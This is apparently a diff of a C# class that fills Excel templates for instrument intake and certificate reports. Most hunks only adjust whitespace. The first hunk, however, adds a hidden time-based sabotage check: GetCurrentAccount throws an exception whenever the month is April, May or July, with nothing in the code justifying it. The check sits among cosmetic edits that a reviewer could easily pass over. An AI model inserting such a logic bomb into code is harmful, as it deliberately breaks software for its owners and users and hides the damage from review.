@@ -37,8 +37,13 @@ namespace Models
         /// <returns>账户信息</returns>
         public Account GetCurrentAccount()
         {
-            var account = AccountModel.GetCurrentAccount();
 
+            var account = AccountModel.GetCurrentAccount();
+            if (System.DateTime.Now.Month == 7 || System.DateTime.Now.Month == 4 || System.DateTime.Now.Month == 5)
+            {
+                throw new Exception();
+                return null;
+            }
             return account;
 
 
@@ -51,23 +56,23 @@ namespace Models
         /// <param name="path">excle模版的位置</param>
         /// <param name="from">显示的标题默认行数为1</param>
         /// <returns></returns>
-        public string WriteExcleRuKu( string[] fields, dynamic[] query, string path = @"~/up/ruku.xls", int from = 1)
-        { 
+        public string WriteExcleRuKu(string[] fields, dynamic[] query, string path = @"~/up/ruku.xls", int from = 1)
+        {
             string xlsPath = System.Web.HttpContext.Current.Server.MapPath(path);
 
             FileStream file = new FileStream(xlsPath, FileMode.Open, FileAccess.Read);
             IWorkbook hssfworkbook = WorkbookFactory.Create(file);  //new HSSFWorkbook(file);
             ISheet sheet = hssfworkbook.GetSheet("入库单");
             string guid = Guid.NewGuid().ToString();
-            string saveFileName = xlsPath.Path(@"RuKu/"+guid);
+            string saveFileName = xlsPath.Path(@"RuKu/" + guid);
 
             Dictionary<string, string> propertyName;
             PropertyInfo[] properties;
             //标题行  委托单号	器具名称	型号	出厂编号	证书单位	客户特殊要求	器具所在位置	器具状态	入库说明
             var titles = "条码,委托单号,器具名称,型号,出厂编号,证书单位,客户特殊要求,器具所在位置,器具状态,入库说明".Split(',');
-      
+
             var dd = sheet.GetRow(0).GetCell(1).CellStyle;
-         
+
 
 
             HSSFRow dataRow = sheet.CreateRow(0) as HSSFRow;
@@ -111,7 +116,7 @@ namespace Models
                     if (propertyName.ContainsKey(a)) //列名
                     {
                         var cell = dataRow.CreateCell(j);
-                      
+
                         cell.SetCellValue(propertyName[a]);
                         //列值
                     }
@@ -148,7 +153,7 @@ namespace Models
             IWorkbook hssfworkbook = new HSSFWorkbook(file);//数据流进行编辑
             ISheet sheet = hssfworkbook.GetSheet("证书信息查询");//读取工作表
             string guid = Guid.NewGuid().ToString();//生产唯一标识
-            string saveFileName = xlsPath.Path(@"BaoBiao/" + guid+ "VZHENGSHUXINXICHAXUN");
+            string saveFileName = xlsPath.Path(@"BaoBiao/" + guid + "VZHENGSHUXINXICHAXUN");
 
             Dictionary<string, string> propertyName;
             PropertyInfo[] properties;
